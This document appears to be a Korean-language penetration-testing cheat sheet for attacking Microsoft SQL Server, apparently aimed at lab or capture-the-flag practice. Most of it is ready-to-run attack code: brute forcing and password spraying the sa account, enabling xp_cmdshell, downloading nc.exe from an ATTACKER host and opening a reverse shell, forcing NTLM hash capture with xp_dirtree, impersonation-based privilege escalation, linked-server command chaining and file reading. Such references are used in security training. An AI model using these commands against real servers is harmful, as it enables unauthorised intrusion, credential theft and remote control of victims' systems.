# MSSQL (1433)

Microsoft SQL Server. Windows 환경에서 흔히 발견되며, xp_cmdshell을 통한 OS 명령 실행이 가능.

---

## 열거

```bash
nmap -sV -sC -p 1433 TARGET
nmap --script=ms-sql-info,ms-sql-config,ms-sql-ntlm-info -p 1433 TARGET
```

---

## 접속

```bash
# Impacket
impacket-mssqlclient DOMAIN/user:pass@TARGET
impacket-mssqlclient DOMAIN/user:pass@TARGET -windows-auth

# nxc
nxc mssql TARGET -u user -p pass
nxc mssql TARGET -u user -p pass --local-auth

# sqsh (Linux)
sqsh -S TARGET -U user -P pass
sqsh -S TARGET -U 'DOMAIN\user' -P pass

# sqlcmd (Windows)
sqlcmd -S TARGET -U user -P pass
```

---

## 인증 공격

```bash
# Default 계정: sa (System Administrator)
nxc mssql TARGET -u sa -p passwords.txt

# Password Spray
nxc mssql TARGET -u users.txt -p 'Password1!' --continue-on-success
```

---

## 후속 공격

### 정보 수집

```sql
-- 버전
SELECT @@version;

-- 현재 사용자
SELECT SYSTEM_USER;
SELECT USER_NAME();

-- sysadmin 여부
SELECT IS_SRVROLEMEMBER('sysadmin');

-- 데이터베이스 목록
SELECT name FROM sys.databases;

-- 현재 DB의 테이블
SELECT * FROM INFORMATION_SCHEMA.TABLES;

-- 링크된 서버
SELECT * FROM sys.servers;
EXEC sp_linkedservers;
```

### xp_cmdshell (OS 명령 실행)

```sql
-- 활성화
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;

-- 명령 실행
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'dir C:\';
EXEC xp_cmdshell 'powershell -c "IWR http://ATTACKER/nc.exe -OutFile C:\temp\nc.exe"';
EXEC xp_cmdshell 'C:\temp\nc.exe ATTACKER 4444 -e cmd.exe';

-- nxc로 명령 실행
nxc mssql TARGET -u sa -p pass -x "whoami"
nxc mssql TARGET -u sa -p pass -x "whoami" --no-output
```

### NTLM hash capture (xp_dirtree)

```sql
-- SMB 요청 강제 → Responder로 hash capture
EXEC xp_dirtree '\\ATTACKER\share';
EXEC master.dbo.xp_dirtree '\\ATTACKER\share';

-- xp_fileexist
EXEC xp_fileexist '\\ATTACKER\share\file';
```

### 권한 상승 (Impersonation)

```sql
-- Impersonate 가능한 로그인 확인
SELECT distinct b.name FROM sys.server_permissions a
INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE';

-- Impersonate 실행
EXECUTE AS LOGIN = 'sa';
EXEC xp_cmdshell 'whoami';
```

### Linked Server 공격

```sql
-- 링크된 서버에서 명령 실행
EXEC ('xp_cmdshell ''whoami''') AT [LINKED_SERVER];

-- 링크된 서버를 통한 체인
EXEC ('EXEC (''xp_cmdshell ''''whoami'''''') AT [LINKED2]') AT [LINKED1];
```

### 파일 읽기

```sql
-- OPENROWSET으로 파일 읽기
SELECT * FROM OPENROWSET(BULK N'C:\Users\Administrator\Desktop\flag.txt', SINGLE_CLOB) AS Contents;
```

---

## Nmap NSE

```bash
nmap --script=ms-sql-brute -p 1433 TARGET
nmap --script=ms-sql-empty-password -p 1433 TARGET
nmap --script=ms-sql-xp-cmdshell --script-args mssql.username=sa,mssql.password=pass -p 1433 TARGET
```
